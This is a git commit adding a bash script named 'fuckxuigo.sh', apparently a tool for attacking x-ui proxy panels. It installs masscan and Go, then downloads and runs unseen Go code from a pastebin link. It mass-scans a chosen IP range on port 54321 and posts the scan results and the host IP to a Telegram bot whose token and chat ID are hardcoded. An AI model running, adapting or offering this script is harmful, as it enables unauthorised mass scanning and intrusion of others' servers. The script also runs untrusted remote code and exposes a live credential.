c3b75bbd6e144a5735601e804419b27192bc605b
Aries <96482448+AriesEDGE@users.noreply.github.com>
2023-06-11 20:43:25 +0800

    Create fuckxuigo.sh

---
+++ fuckxuigo.sh
@@ -0,0 +1,35 @@
+#! /bin/bash
+upd(){
+    apt-get update
+    apt-get upgrade
+    apt install masscan
+    apt install libpcap-dev
+    apt install golang
+}
+
+pyzt(){
+    curl -o cs.go https://pastebin.com/raw/qnNvDG6f
+}
+
+cvv(){
+    go run cs.go
+}
+
+tgbots(){
+    echo "这台机器的IP是`curl ip.sb`" >> result.txt
+    TOKEN=5677739231:AAG6zUBUJg2AQL9lxplHQBba1V5dNnVZnq4	
+    chat_ID=5770708575		
+    message_text=`cat result.txt`	
+    MODE='HTML'
+    URL="https://api.telegram.org/bot${TOKEN}/sendMessage"	
+    curl -s -X POST $URL -d chat_id=${chat_ID}  -d parse_mode=${MODE} -d text="${message_text}"  >> /dev/null
+}
+upd
+pyzt
+echo "Enter your IP CIOR!"
+read sbip
+echo "ENTER YOUR MAX FUCKXUI RATE!"
+read fucku
+masscan -p54321 ${sbip} --max-rate ${fucku} -oG results.txt
+cvv
+tgbots
